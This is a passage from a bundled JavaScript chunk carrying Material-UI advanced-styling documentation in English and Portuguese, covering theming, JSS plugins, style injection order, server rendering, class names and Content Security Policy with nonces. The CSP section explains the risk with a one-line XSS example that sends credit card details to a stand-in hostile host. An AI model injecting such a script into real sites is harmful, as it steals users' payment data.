[jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it\u2019s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Por defecto\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Content Security Policy (CSP)\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### How does one implement CSP?\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nYou must include this header regardless of whether or not SSR is used. Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```"},ehgw:function(e,n){e.exports="import * as React from 'react';\nimport { ThemeProvider, makeStyles } from '@material-ui/core/styles';\n\nconst themeInstance = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nconst useStyles = makeStyles((theme: typeof themeInstance) => ({\n  root: {\n    background: theme.background,\n    border: 0,\n    fontSize: 16,\n    borderRadius: 3,\n    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n}));\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theming\n    </button>\n  );\n}\n\nexport default function Theming() {\n  return (\n    <ThemeProvider theme={themeInstance}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},g9mt:function(e,n){e.exports="# Avan\xe7ado\n\n<p class=\"description\">Esta se\xe7\xe3o aborda o uso mais avan\xe7ado de @material-ui/core/styles.</p>\n\n## Temas\n\nAdicione um `ThemeProvider` para o n\xedvel superior de sua aplica\xe7\xe3o para passar um tema pela \xe1rvore de componentes do React. Ent\xe3o, voc\xea pode acessar o objeto de tema em fun\xe7\xf5es de estilo.\n\n> Este exemplo cria um objeto do tema para componentes customizados. Se voc\xea pretende usar alguns dos componentes do Material-UI, voc\xea precisa fornecer uma estrutura de tema mais rica usando o m\xe9todo `createMuiTheme()`. V\xe1 at\xe9 a [se\xe7\xe3o de temas](/customization/theming/) para aprender como construir seu tema customizado do Material-UI.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Acessando o tema em um componente\n\nVoc\xea pode precisar acessar as vari\xe1veis de tema dentro de seus componentes React.\n\n#### `useTheme` hook\n\nPara uso em componentes de fun\xe7\xe3o:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nPara uso em classe ou componentes de fun\xe7\xe3o:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Aninhamento de tema\n\nVoc\xea pode aninhar v\xe1rios provedores de tema. Isso pode ser muito \xfatil ao lidar com diferentes \xe1reas da sua aplica\xe7\xe3o que t\xeam apar\xeancia distinta entre si.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nO tema interno **sobrescrever\xe1** o tema externo. Voc\xea pode estender o tema externo fornecendo uma fun\xe7\xe3o:\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Sobrescrevendo estilos - Propriedade `classes`\n\nO `makeStyles` (hook generator) e `withStyles` (HOC) APIs permitem a cria\xe7\xe3o de v\xe1rias regras de estilos por folha de estilo. Cada regra de estilo tem seu pr\xf3prio nome de classe. Os nomes das classes s\xe3o fornecidos para o componente com a vari\xe1vel `classes`. Isso \xe9 particularmente \xfatil ao estilizar elementos aninhados em um componente.\n\n```jsx\n// Uma folha de estilo\nconst useStyles = makeStyles({\n  root: {}, // uma regra de estilo\n  label: {}, // uma regra de estilo aninhada\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nNo entanto, os nomes das classes geralmente n\xe3o s\xe3o determin\xedsticos. Como um componente pai pode substituir o estilo de um elemento aninhado?\n\n### `withStyles`\n\nEste \xe9 o caso mais simples. O componente encapsulado aceita a propriedade `classes`, ele simplesmente mescla os nomes de classes fornecidos com a folha de estilo.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // uma regra de estilo\n  label: {}, // uma regra de estilo aninhada\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Aninhado\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nA API hook requer um pouco mais de trabalho. Voc\xea tem que encaminhar as propriedades do pai para o hook como primeiro argumento.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // uma regra de estilo\n  label: {}, // uma regra de estilo aninhada\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## Plugins JSS\n\nJSS usa plugins para estender sua ess\xeancia, permitindo que voc\xea escolha os recursos que voc\xea precisa, e somente pague pela sobrecarga de desempenho para o que voc\xea est\xe1 usando.\n\nNem todos os plugins est\xe3o dispon\xedveis por padr\xe3o no Material-UI. O seguinte (que \xe9 um subconjunto de [jss-preset-default](https://cssinjs.org/jss-preset-default/)) est\xe3o inclu\xeddos:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nClaro, voc\xea \xe9 livre para usar plugins adicionais. Aqui est\xe1 um exemplo com o plugin [jss-rtl](https://github.com/alitaheri/jss-rtl).\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String templates\n\nSe voc\xea preferir a sintaxe CSS sobre o JSS, voc\xea pode usar o plugin [jss-plugin-template ](https://cssinjs.org/jss-plugin-template/).\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote que isto n\xe3o suporta seletores, ou regras aninhadas.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## Ordem de inje\xe7\xe3o de CSS\n\n> \xc9 **realmente importante** entender como a especificidade do CSS \xe9 calculada pelo navegador, como um dos elementos chave para saber quando sobrescrever estilos. Recomendamos que voc\xea leia este par\xe1grafo do MDN: [Como a especificidade \xe9 calculada?](https://developer.mozilla.org/pt-BR/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nPor padr\xe3o, os estilos s\xe3o inseridos **por \xfaltimo** no elemento `<head>` da sua p\xe1gina. Eles ganham mais especificidade do que qualquer outra folha de estilo em sua p\xe1gina, por exemplo, m\xf3dulos CSS, componentes estilizados (styled components).\n\n### injectFirst\n\nO componente `StylesProvider` tem uma propriedade `injectFirst` para injetar as tags de estilo em **primeiro** no cabe\xe7alho (menor prioridade):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Sua \xe1rvore de componentes.\n      Componentes com estilo podem sobrescrever os estilos de Material-UI. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nA inje\xe7\xe3o de tags de estilo acontece na **mesma ordem** com as invoca\xe7\xf5es de `makeStyles` / `withStyles` / `styled`. Por exemplo, a cor vermelha ganha maior especificidade neste caso:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Ordem n\xe3o importa\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Ordem n\xe3o importa\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 vence.\n  return <div className={className} />;\n}\n```\n\nA ordem de chamada do hook e a ordem de concatena\xe7\xe3o da classe **n\xe3o importam**.\n\n### Ponto de inser\xe7\xe3o (insertionPoint)\n\nJSS [fornece um mecanismo](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) para controlar esta situa\xe7\xe3o. Adicionando um `ponto de inser\xe7\xe3o` dentro do HTML, voc\xea pode [ controlar a ordem](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) que as regras CSS s\xe3o aplicadas aos seus componentes.\n\n#### Coment\xe1rio HTML\n\nA abordagem mais simples \xe9 adicionar um coment\xe1rio HTML no `<head>` que determina onde o JSS vai injetar os estilos:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Defina um ponto de inser\xe7\xe3o customizado que o JSS ir\xe1 procurar para injetar os estilos no DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Outros elementos HTML\n\n[Create React App](https://github.com/facebook/create-react-app) remove coment\xe1rios em HTML ao criar a compila\xe7\xe3o de produ\xe7\xe3o. Para contornar esse comportamento, voc\xea pode fornecer um elemento DOM (diferente de um coment\xe1rio) como o ponto de inser\xe7\xe3o do JSS, por exemplo, um elemento `<noscript>`:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Defina um ponto de inser\xe7\xe3o customizado que o JSS ir\xe1 procurar para injetar os estilos no DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io impede o acesso ao elemento `<head>`. Para contornar esse comportamento, voc\xea pode usar a API JavaScript `documento.createComment()`:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Defina um ponto de inser\xe7\xe3o customizado que o JSS ir\xe1 procurar para injetar os estilos no DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Renderiza\xe7\xe3o no servidor (Server-Side Rendering)\n\nEste exemplo retorna uma string de HTML e insere o CSS cr\xedtico necess\xe1rio, logo antes de ser usado:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nVoc\xea pode [seguir o guia lado do servidor](/guides/server-rendering/) para um exemplo mais detalhado, ou leia o [`ServerStyleSheets` na documenta\xe7\xe3o da API](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nExiste [um plugin oficial Gatsby](https://github.com/hupe1980/gatsby-plugin-material-ui) que permite a renderiza\xe7\xe3o do lado do servidor para `@material-ui/styles`. Consulte a p\xe1gina do plugin para obter instru\xe7\xf5es de configura\xe7\xe3o e uso.\n\nConsulte [este exemplo de projeto Gatsby](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) para um exemplo de uso atualizado.\n\n### Next.js\n\nVoc\xea precisa ter um `pages/_document.js` customizado, ent\xe3o copie [esta l\xf3gica](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) para injetar os estilos renderizados no lado do servidor no elemento `<head>`.\n\nPara um exemplo de uso atualizado, consulte [este projeto de exemplo](https://github.com/mui-org/material-ui/blob/next/examples/nextjs).\n\n## Nomes de classes (Class names)\n\nOs nomes de classes s\xe3o gerados pelo [gerador de nome de classe](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Padr\xe3o\n\nPor padr\xe3o, os nomes de classes gerados por `@material-ui/core/styles` s\xe3o **n\xe3o determin\xedsticos**; voc\xea n\xe3o pode confiar que eles ir\xe3o permanecer os mesmos. Vejamos a seguinte estilo como um exemplo:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nIsto ir\xe1 gerar um nome de classe como `makeStyles-root-123`.\n\nVoc\xea tem que usar a propriedade `classes` de um componente para sobrescrever os estilos. A comportamento n\xe3o determin\xedstico dos nomes de classes permitem o isolamento de estilos.\n\n- Em **desenvolvimento**, o nome da classe \xe9: `.makeStyles-root-123` seguindo esta l\xf3gica:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- Em **produ\xe7\xe3o**, o nome da classe \xe9: `.jss123 ` seguindo esta l\xf3gica:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### Com `@material-ui/core`\n\nOs nomes de classe gerados dos componentes `@material-ui/core ` se comportam de maneira diferente. Quando as seguintes condi\xe7\xf5es s\xe3o atendidas, os nomes das classes s\xe3o **determin\xedsticos**:\n\n- Apenas um provedor de tema \xe9 usado (**Sem aninhamento de tema **)\n- A folha de estilo tem um nome que come\xe7a com `Mui` (todos os componentes de Material-UI).\n- A op\xe7\xe3o `disableGlobal` do [gerador de nome de clasee](/styles/api/#creategenerateclassname-options-class-name-generator) \xe9 `false` (o padr\xe3o).\n\nEssas condi\xe7\xf5es s\xe3o atendidas com a forma de uso mais comum de `@material-ui/core`. Por exemplo, esta folha de estilo:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngera os seguintes nomes de classe que voc\xea pode sobrescrever:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*Esta \xe9 uma simplifica\xe7\xe3o da folha de estilo do componente `@material-ui/core/Button`.*\n\nA customiza\xe7\xe3o de campos de texto pode ser inc\xf4moda com a [API `classes`](#overriding-styles-classes-prop), onde voc\xea tem que definir a propriedade classes. \xc9 mais f\xe1cil usar os valores padr\xe3o, conforme descrito acima. Por exemplo:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nO plugin [`jss-plugin-global`](#jss-plugins) \xe9 instalado na predefini\xe7\xe3o padr\xe3o. Voc\xea pode us\xe1-lo para definir nomes de classes globais.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### H\xedbrido\n\nVoc\xea tamb\xe9m pode combinar nomes de classe gerados pelo JSS com nomes globais.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## Prefixos CSS\n\nO JSS usa recursos de detec\xe7\xe3o para aplicar os prefixos corretos. [N\xe3o fique surpreso](https://github.com/mui-org/material-ui/issues/9293) se 